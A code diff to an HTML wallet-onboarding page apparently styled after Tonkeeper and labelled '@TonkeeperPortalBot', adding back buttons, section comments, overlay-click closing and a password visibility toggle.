@@ -89,12 +89,16 @@
         .pass-field-group:focus-within { border-color: #0098EA; }
         .pass-title { color: #8A929A; font-size: 12px; margin-bottom: 2px; }
         .pass-input-actual { width: 100%; background: transparent; border: none; outline: none; color: white; font-size: 17px; }
+
+        .back-btn-float { position: absolute; top: 16px; left: 16px; color: #8A929A; background: transparent; border: none; cursor: pointer; z-index: 30; padding: 8px; display: flex; align-items: center; justify-content: center; }
+        .back-btn-float:active { color: white; }
     </style>
 </head>
 <body>
 
     <div id="bg-overlay" class="overlay"></div>
 
+    <!-- 1. SPLASH -->
     <div id="screen-splash" class="screen flex items-center justify-center">
         <svg width="110" height="110" viewBox="0 0 256 256" id="logo-svg">
             <path id="main-p" class="logo-part" d="M128 30L228 105L128 135L28 105L128 30Z" fill="#58C0FF"/>
@@ -104,6 +108,7 @@
         <div class="absolute bottom-10 bot-tag">@TonkeeperPortalBot</div>
     </div>
 
+    <!-- 2. WELCOME -->
     <div id="screen-welcome" class="screen">
         <div class="w-full max-w-[420px] flex flex-col px-8 py-10 h-full">
             <main class="flex-grow flex flex-col justify-center">
@@ -124,6 +129,7 @@
         </div>
     </div>
 
+    <!-- 3. ADD WALLET SHEET -->
     <div id="add-wallet-sheet">
         <div class="w-10 h-1 bg-tk-border rounded-full mx-auto mt-3 mb-2 opacity-50"></div>
         <div class="px-8 pt-6">
@@ -147,12 +153,14 @@
         </div>
     </div>
 
+    <!-- 4. GENERATING -->
     <div id="screen-gen" class="screen flex items-center justify-center">
         <div class="bolt-anim mb-8"><svg width="80" height="80" viewBox="0 0 24 24" fill="#31A6F1"><circle cx="12" cy="12" r="3" fill="#31A6F1"/><path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm0 18c-4.418 0-8-3.582-8-8s3.582-8 8-8 8 3.582 8 8-3.582 8-8 8z" fill="#31A6F1" opacity="0.3"/><path d="M12 4V2M12 22v-2M4 12H2m20 0h-2M6.343 6.343L4.929 4.929m14.142 14.142l-1.414-1.414M6.343 17.657l-1.414 1.414m14.142-14.142l-1.414 1.414" stroke="#31A6F1" stroke-width="2" stroke-linecap="round"/></svg></div>
         <h2 class="text-[24px] font-bold">Generating wallet...</h2>
         <div class="absolute bottom-10 bot-tag">@TonkeeperPortalBot</div>
     </div>
 
+    <!-- 5. CREATED -->
     <div id="screen-done" class="screen flex items-center justify-center">
         <svg width="100" height="100" viewBox="0 0 52 52" class="mb-8">
             <circle class="check-circle" cx="26" cy="26" r="25" />
@@ -162,7 +170,9 @@
         <div class="absolute bottom-10 bot-tag">@TonkeeperPortalBot</div>
     </div>
 
+    <!-- 6. GRAB A PEN -->
     <div id="screen-paper" class="screen px-8 py-12">
+        <button class="back-btn-float" onclick="show('screen-welcome')"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
         <main class="flex-grow flex flex-col items-center justify-center">
             <div class="mb-10 text-tk-blue"><svg width="120" height="120" viewBox="0 0 24 24" fill="currentColor"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg></div>
             <h2 class="text-[30px] font-bold mb-4 text-center">Grab a pen<br>and a piece of paper</h2>
@@ -172,7 +182,9 @@
         <div class="bot-tag pt-4">@TonkeeperPortalBot</div>
     </div>
 
+    <!-- 7. FINAL RECOVERY PHRASE -->
     <div id="screen-recovery" class="screen">
+        <button class="back-btn-float" onclick="show('screen-paper')"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
         <div class="px-6 flex-grow overflow-y-auto pb-44 w-full">
             <h1 class="text-[32px] font-bold text-center mt-12 mb-2">Your recovery phrase</h1>
             <p class="text-tk-text-gray text-center text-[16px] mb-10 leading-snug">Write down these 24 words in the order given below and store them in a secret, safe place.</p>
@@ -184,7 +196,9 @@
         </div>
     </div>
 
+    <!-- 8. SO, LET'S CHECK -->
     <div id="screen-check" class="screen px-8">
+        <button class="back-btn-float" onclick="show('screen-recovery')"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
         <div class="w-full flex-grow flex flex-col items-center pt-12">
             <h1 class="text-[32px] font-bold text-center mb-2">So, let's check</h1>
             <p class="text-tk-text-gray text-center text-[16px] mb-10 leading-snug px-4">
@@ -202,6 +216,7 @@
         </div>
     </div>
 
+    <!-- 9. CREATE PASSWORD -->
     <div id="password-sheet">
         <div class="w-10 h-1 bg-tk-border rounded-full mx-auto mt-3 mb-4 opacity-50"></div>
         <div class="px-8">
@@ -214,7 +229,7 @@
                 <div class="pass-field-group relative">
                     <div class="pass-title">Re-enter password</div>
                     <input type="password" id="pass-2" class="pass-input-actual" oninput="validatePassword()">
-                    <div class="absolute right-4 bottom-3 text-tk-text-gray">
+                    <div class="absolute right-4 bottom-3 text-tk-text-gray cursor-pointer" onclick="togglePasswordVisibility()">
                         <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
                     </div>
                 </div>
@@ -237,7 +252,7 @@
         function openPasswordSheet() { 
             passSheet.classList.add('open'); 
             overlay.classList.add('active');
-            overlay.onclick = null; // Отключаем клик по фону, чтобы не закрывалось случайно
+            overlay.onclick = closeAllSheets; // Возвращаем закрытие по клику на фон
         }
 
         function closeAllSheets() { 
@@ -276,6 +291,14 @@
         function validatePassword() {
             const p1 = document.getElementById('pass-1').value, p2 = document.getElementById('pass-2').value, btn = document.getElementById('btn-pass-continue');
             if (p1.length >= 6 && p1 === p2) { btn.classList.remove('btn-disabled'); } else { btn.classList.add('btn-disabled'); }
+        }
+
+        function togglePasswordVisibility() {
+            const p1 = document.getElementById('pass-1');
+            const p2 = document.getElementById('pass-2');
+            const newType = p1.type === 'password' ? 'text' : 'password';
+            p1.type = newType;
+            p2.type = newType;
         }
     </script>
 </body>
